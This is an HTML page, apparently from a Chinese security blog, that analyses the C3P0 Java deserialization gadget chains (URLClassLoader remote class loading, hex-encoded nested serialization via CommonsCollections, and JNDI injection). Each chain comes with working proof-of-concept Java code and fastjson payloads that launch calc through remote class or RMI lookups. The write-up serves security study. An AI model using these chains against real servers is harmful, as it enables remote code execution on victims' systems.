@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>C3P0链 - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "C3P0\u94fe", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "C3P0\uff1f", url: "#c3p0_1" },
+              {title: "Gadget", url: "#gadget" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../CC%E9%93%BE%E5%88%86%E6%9E%90/CC%E9%93%BE%E5%88%86%E6%9E%90/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../CC%E9%93%BE%E5%88%86%E6%9E%90/CC%E9%93%BE%E5%88%86%E6%9E%90/" class="btn btn-xs btn-link">
+        CC链分析
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../8u20%E9%93%BE%E6%B5%85%E6%9E%90/8u20%E9%93%BE%E6%B5%85%E6%9E%90/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../8u20%E9%93%BE%E6%B5%85%E6%9E%90/8u20%E9%93%BE%E6%B5%85%E6%9E%90/" class="btn btn-xs btn-link">
+        8u20链浅析
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="c3p0">C3P0链</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#C3P0">C3P0？</a></li>
+<li><a href="#Gadget">Gadget</a><ul>
+<li><a href="#URLClassLoader">URLClassLoader</a><ul>
+<li><a href="#POC">POC</a></li>
+<li><a href="#总结">总结</a></li>
+</ul>
+</li>
+<li><a href="#hex-base">hex base</a><ul>
+<li><a href="#POC">POC</a></li>
+<li><a href="#总结">总结</a></li>
+</ul>
+</li>
+<li><a href="#jndi">jndi</a><ul>
+<li><a href="#POC">POC</a></li>
+<li><a href="#总结">总结</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="c3p0_1">C3P0？</h2>
+<p>C3P0是JDBC的一个连接池组件</p>
+<p>JDBC:</p>
+<blockquote>
+<p>"JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。
+使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。"</p>
+</blockquote>
+<p>连接池：</p>
+<blockquote>
+<p>"我们在讲多线程的时候说过，创建线程是一个昂贵的操作，如果有大量的小任务需要执行，并且频繁地创建和销毁线程，实际上会消耗大量的系统资源，往往创建和消耗线程所耗费的时间比执行任务的时间还长，所以，为了提高效率，可以用线程池。
+类似的，在执行JDBC的增删改查的操作时，如果每一次操作都来一次打开连接，操作，关闭连接，那么创建和销毁JDBC连接的开销就太大了。为了避免频繁地创建和销毁JDBC连接，我们可以通过连接池（Connection Pool）复用已经创建好的连接。"</p>
+</blockquote>
+<p>C3P0：</p>
+<blockquote>
+<p><strong>C3P0是</strong>一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。 使用它的开源项目有Hibernate、Spring等。</p>
+</blockquote>
+<h2 id="gadget">Gadget</h2>
+<p>C3P0链的相关依赖及版本，从ysoserial中可以看到</p>
+<pre><code class="language-java">C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
+</code></pre>
+<p>pom.xml，maven中添加此组件会自动加载mchange-commons-java这个包</p>
+<pre><code class="language-java">&lt;dependencies&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;com.mchange&lt;/groupId&gt;
+            &lt;artifactId&gt;c3p0&lt;/artifactId&gt;
+            &lt;version&gt;0.9.5.2&lt;/version&gt;
+        &lt;/dependency&gt;
+    &lt;/dependencies&gt;
+</code></pre>
+<h3 id="urlclassloader">URLClassLoader</h3>
+<p>这条链在许多文章中也被称为http base链。</p>
+<p>在PoolBackedDataSourceBase类（抽象类）的writeObject方法中有如下内容</p>
+<p><img alt="" src="../image/image_bvu7p1OIcI.png" /></p>
+<p>该方法会尝试将当前对象的connectionPoolDataSource属性进行序列化，如果不能序列化便会在catch块中对connectionPoolDataSource属性用ReferenceIndirector.indirectForm方法处理后再进行序列化操作。我们跟进ReferenceIndirector.indirectForm方法。</p>
+<p><img alt="" src="../image/image_hiz3nFw3ei.png" /></p>
+<p>此方法会调用connectionPoolDataSource属性的getReference方法，并用返回结果作为参数实例化一个ReferenceSerialized对象，然后将ReferenceSerialized对象返回，ReferenceSerialized被序列化。
+下图是ReferenceSerialized构造方法，结合上文可以发现，其reference对象是人为可控的。</p>
+<p><img alt="" src="../image/image_fsgGHs10Z6.png" /></p>
+<p>尽然说到了PoolBackedDataSourceBase的writeObject方法，有序列化肯定就有反序列化，那自然而然到PoolBackedDataSourceBase的readObject方法看看。</p>
+<p><img alt="" src="../image/image_REWC7mMqzO.png" /></p>
+<p>可以看到会调用序列流中的对象的getObject方法，结合上文，如果ReferenceSerialized被序列化到了序列流中，那么这里可以是ReferenceSerialized#getObject，我们进行跟进。
+跟进后可以发现调用了ReferenceableUtils.referenceToObject这个静态方法，再度进行跟进</p>
+<p><img alt="" src="../image/image_zImWfS0Uvq.png" /></p>
+<p>由于ref是在序列化的时候可以控制的参数，那么fClassName自然也是可以控制的属性。
+结合下图黄框中的内容不难发现，我们可以通过URLClassLoader实例化远程类，造成任意代码执行。</p>
+<p><img alt="" src="../image/image_BtDU-5A2jc.png" /></p>
+<h4 id="poc">POC</h4>
+<pre><code class="language-java">import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
+import com.mchange.v2.naming.ReferenceIndirector;
+
+import javax.naming.Name;
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import javax.naming.Referenceable;
+import javax.sql.ConnectionPoolDataSource;
+import javax.sql.PooledConnection;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.rmi.Naming;
+import java.sql.SQLException;
+import java.sql.SQLFeatureNotSupportedException;
+import java.util.logging.Logger;
+
+public class c3p {
+    public static void main(String[] args) throws Exception{
+        PoolBackedDataSourceBase a = new PoolBackedDataSourceBase(false);
+        Class clazz = Class.forName(&quot;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&quot;);
+        Field f1 = clazz.getDeclaredField(&quot;connectionPoolDataSource&quot;); //此类是PoolBackedDataSourceBase抽象类的实现
+        f1.setAccessible(true);
+        f1.set(a,new evil());
+
+        ObjectOutputStream ser = new ObjectOutputStream(new FileOutputStream(new File(&quot;a.bin&quot;)));
+        ser.writeObject(a);
+        ser.close();
+        ObjectInputStream unser = new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;));
+        unser.readObject();
+        unser.close();
+    }
+
+    public static class evil implements ConnectionPoolDataSource, Referenceable {
+        public PrintWriter getLogWriter () throws SQLException {return null;}
+        public void setLogWriter ( PrintWriter out ) throws SQLException {}
+        public void setLoginTimeout ( int seconds ) throws SQLException {}
+        public int getLoginTimeout () throws SQLException {return 0;}
+        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
+        public PooledConnection getPooledConnection () throws SQLException {return null;}
+        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}
+
+        @Override
+        public Reference getReference() throws NamingException {
+            return new Reference(&quot;evilexp&quot;,&quot;evilexp&quot;,&quot;http://127.0.0.1:10099/&quot;);
+        }
+    }
+}
+
+</code></pre>
+<pre><code class="language-java">public class evilexp {
+    public evilexp() throws Exception{
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+    }
+}
+
+</code></pre>
+<p><img alt="" src="../image/image_5NZwhLZKdb.png" /></p>
+<p><img alt="" src="../image/image_Xo9RThaLfI.png" /></p>
+<h4 id="_2">总结</h4>
+<p>PoolBackedDataSource在序列化时可以序列化入一个任意Reference类，在PoolBackedDataSource反序列化时该Reference类中指定的对象会被URLClassLoader远程加载实例化。</p>
+<h3 id="hex-base">hex base</h3>
+<p>如果不出网，而且是fastjson或jackson的情况，可以用这个Gadget。</p>
+<p>WrapperConnectionPoolDataSourceBase有属性userOverridesAsString及其setter方法setuserOverridesAsString。</p>
+<p><img alt="" src="../image/image_fBKY1Frrqf.png" /></p>
+<p>这里可以联想到 接下来可能会调用与userOverridesAsString相关方法
+可以尝试着写个main函数调用一下setuserOverridesAsString方法，然后在parseUserOverridesAsString打个断点试试，断点命中。
+为什么在parseUserOverridesAsString打断点呢，因为这个方法中有与反序列化操作相关的字眼（黄框中）</p>
+<pre><code class="language-java">    public static void main(String[] args) throws Exception{
+        a.setUserOverridesAsString(&quot;123&quot;);
+        }
+</code></pre>
+<p><img alt="" src="../image/image_pxOpuQHPDw.png" /></p>
+<p><img alt="" src="../image/image_264q4swFzB.png" /></p>
+<p><img alt="" src="../image/image_DTxqMbToXu.png" /></p>
+<p>parseUserOverridesAsString会先把userOverrideAsString属性进行截取（也就是上图中userOverrideAsString属性中HexAsciiSerializedMap后面的部分），然后将其视为十六进制数据转化成byte，然后调用SerializableUtils.fromByteArray对其进行处理</p>
+<p><img alt="" src="../image/image_S3Xi6L1lm0.png" /></p>
+<p>SerializableUtils.fromByteArray会对byte进行反序列化处理。</p>
+<p>在fastjson，jackson等环镜下，userOverridesAsString属性可控，导致可以从其setter方法setuserOverridesAsString开始到最后deserializeFromByteArray对其调用readObject进行反序列化，造成反序列化漏洞。</p>
+<h4 id="poc_1">POC</h4>
+<p>用cc2链打的</p>
+<pre><code class="language-java">import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+public class c3p {
+    public static void main(String[] args) throws Exception{
+        PriorityQueue a = go();
+        ObjectOutputStream ser0 = new ObjectOutputStream(new FileOutputStream(new File(&quot;a.bin&quot;)));
+        ser0.writeObject(a);
+        ser0.close();
+
+        InputStream in = new FileInputStream(&quot;a.bin&quot;);
+        byte[] bytein = toByteArray(in);
+        String Hex = &quot;HexAsciiSerializedMap:&quot;+bytesToHexString(bytein,bytein.length)+&quot;p&quot;;
+        WrapperConnectionPoolDataSource exp = new WrapperConnectionPoolDataSource();
+        exp.setUserOverridesAsString(Hex);
+
+        ObjectOutputStream ser = new ObjectOutputStream(new FileOutputStream(new File(&quot;b.bin&quot;)));
+        ser.writeObject(exp);
+        ser.close();
+        ObjectInputStream unser = new ObjectInputStream(new FileInputStream(&quot;b.bin&quot;));
+        unser.readObject();
+        unser.close();
+    }
+
+    public static PriorityQueue go() throws Exception{
+
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
+                        String.class, Class[].class }, new Object[] {
+                        &quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {
+                        Object.class, Object[].class }, new Object[] {
+                        null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] { String.class }, new Object[]{&quot;calc.exe&quot;})});
+
+        TransformingComparator comparator = new TransformingComparator(chain);
+        PriorityQueue queue = new PriorityQueue(1);
+
+        queue.add(1);
+        queue.add(2);
+
+        Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+        field.setAccessible(true);
+        field.set(queue,comparator);
+
+        return queue;
+    }
+
+    public static byte[] toByteArray(InputStream in) throws IOException {
+        byte[] classBytes;
+        classBytes = new byte[in.available()];
+        in.read(classBytes);
+        in.close();
+        return classBytes;
+    }
+
+    public static String bytesToHexString(byte[] bArray, int length) {
+        StringBuffer sb = new StringBuffer(length);
+
+        for(int i = 0; i &lt; length; ++i) {
+            String sTemp = Integer.toHexString(255 &amp; bArray[i]);
+            if (sTemp.length() &lt; 2) {
+                sb.append(0);
+            }
+
+            sb.append(sTemp.toUpperCase());
+        }
+        return sb.toString();
+    }
+}
+
+
+fastjson exp
+{
+    &quot;a&quot;: {
+        &quot;@type&quot;: &quot;java.lang.Class&quot;,
+        &quot;val&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;
+    },
+    &quot;b&quot;: {
+        &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,
+        &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:hex编码内容;&quot;
+    }
+}
+</code></pre>
+<h4 id="_3">总结</h4>
+<p>在fastjson，jackson环境中可用，比起下文JNDI Gadget，此Gadget更适合在不出网环境下利用
+WrapperConnectionPoolDataSource的父类中存在属性userOverridesAsString及其setter方法，setter方法会将userOverridesAsString中的包含的Hex信息转换成一个byte属性，然后将此byte属性反序列化。</p>
+<h3 id="jndi">jndi</h3>
+<p>同样也是在fastjson，jackson环境中可用。jndi适用于jdk8u191以下支持reference情况</p>
+<p><img alt="" src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16095753735332.jpg" /></p>
+<p>首先JndiRefConnectionPoolDataSource类中有属性jndiname及其setter方法
+其setter方法会调用内部的JndiRefForwardingDataSource对象的setJndiName方法，改变JndiRefForwardingDataSource#jndiname的值</p>
+<p><img alt="" src="../image/image_yugMp9MzNb.png" /></p>
+<p>其次JndiRefConnectionPoolDataSource类中有LoginTimeout属性及其setter方法
+其setter方法会调用内部WrapperConnectionPoolDataSource对象的setLoginTimeout方法，追踪后会发现来到JndiRefForwardingDataSource#setLoginTimeout</p>
+<p><img alt="" src="../image/image_nJpQG0X4ru.png" /></p>
+<p>我们跟进JndiRefForwardingDataSource#inner，它会调用JndiRefForwardingDataSource#dereference，再度跟进
+此方法中会根据JndiRefForwardingDataSource#jndiName属性进行lookup问询，而jndiName属性从上文看是可以被JndiRefConnectionPoolDataSource#setter方法控制的。</p>
+<p><img alt="" src="../image/image_SAoIpoHjIh.png" /></p>
+<p>那么在fastjson，jackson等环境下，调用JndiRefConnectionPoolDataSource类的jndiname，logintimeout属性setter方法，向jndiname传入恶意RMI服务器地址，然后调用logintimeout的setter方法使受害机去lookup设置好的jndiname中的恶意地址，造成JNDI注入。</p>
+<h4 id="poc_2">POC</h4>
+<pre><code class="language-java">public class c3p {
+    public static void main(String[] args) throws Exception{
+        JndiRefConnectionPoolDataSource exp = new JndiRefConnectionPoolDataSource();
+        exp.setJndiName(&quot;rmi://127.0.0.1:10099/exp&quot;);
+        exp.setLoginTimeout(1);
+    }
+}
+
+fastjson exp:
+String poc = &quot;{\&quot;object\&quot;:[\&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\&quot;,{\&quot;jndiName\&quot;:\&quot;rmi://localhost:8088/Exploit\&quot;, \&quot;loginTimeout\&quot;:0}]}&quot;
+
+</code></pre>
+<h4 id="_4">总结</h4>
+<p>在fastjson，jackson等环境下，调用JndiRefConnectionPoolDataSource类的jndiname，logintimeout属性setter方法，向jndiname传入恶意RMI服务器地址，然后调用logintimeout的setter方法使受害机去lookup设置好的jndiname中的恶意地址，造成JNDI注入。</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../CC%E9%93%BE%E5%88%86%E6%9E%90/CC%E9%93%BE%E5%88%86%E6%9E%90/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../CC%E9%93%BE%E5%88%86%E6%9E%90/CC%E9%93%BE%E5%88%86%E6%9E%90/" class="btn btn-xs btn-link">
+        CC链分析
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../8u20%E9%93%BE%E6%B5%85%E6%9E%90/8u20%E9%93%BE%E6%B5%85%E6%9E%90/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../8u20%E9%93%BE%E6%B5%85%E6%9E%90/8u20%E9%93%BE%E6%B5%85%E6%9E%90/" class="btn btn-xs btn-link">
+        8u20链浅析
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
